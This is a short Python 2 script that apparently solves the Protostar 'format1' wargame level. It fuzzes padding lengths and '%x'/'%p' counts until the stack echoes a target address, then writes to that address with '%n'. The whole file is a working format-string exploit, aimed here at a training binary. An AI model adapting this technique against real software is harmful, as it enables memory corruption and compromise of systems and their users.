import struct, subprocess

target_addr = 0x08049638

padding_before = 'A'
padding_after = 'B'

format_strings = ['%x', '%p']

cmd = "/opt/protostar/bin/format1"

max = 400
min = 100
step = -1

# m = number of padding characters before and after target_addr
for m in range(4, 12, 1):
        for f in format_strings:
                print('[+] Fuzzing: ' + padding_before * m + struct.pack("I", target_addr) + padding_after * m + (' ' + f))
                for n in range(max, min, step):

                        args = padding_before * m + struct.pack("I", target_addr) + padding_after * m + (' ' + f) * n + (' ' + f)
                        results = subprocess.Popen([cmd, args], stdout=subprocess.PIPE).communicate()[0]

                        results_length = len(results.split(' '))

                        last_result = results.split(' ')[results_length - 1]
                        if last_result == hex(target_addr) or last_result == hex(target_addr)[2:10]:
                                print('    [+] Found match: ' + ' '.join([f, str(n), str(m), last_result]))
                                print('    [+] Attempting exploit...')
                                args = padding_before * m + struct.pack("I", target_addr) + padding_after * m + (' ' + f) * n + (' %n')

                                needle = subprocess.Popen([cmd, args], stdout=subprocess.PIPE).communicate()[0]
                                valid_exploit_results = ['you', 'have', 'modified', 'the', 'target', ':)\n']
                                if needle.split(' ')[-6:] == valid_exploit_results: print('        [!] Fukn B00M! ' + ' '.join(needle.split(' ')[-6:]))
